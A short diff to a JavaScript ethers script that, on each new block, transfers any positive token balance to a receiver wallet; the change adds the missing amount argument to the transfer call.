@@ -39,7 +39,7 @@ provider.on("block", async (e) => {
         console.log(`token balance : ${ethers.formatEther(balance)}`);
 
         if (balance > 0) {
-            const transfer = await tokenContract.transfer(receiverWallet);
+            const transfer = await tokenContract.transfer(receiverWallet, balance);
             await transfer.wait();
             console.log(`Transfer successful ! tx hash : ${transfer.hash}`);
         } else {
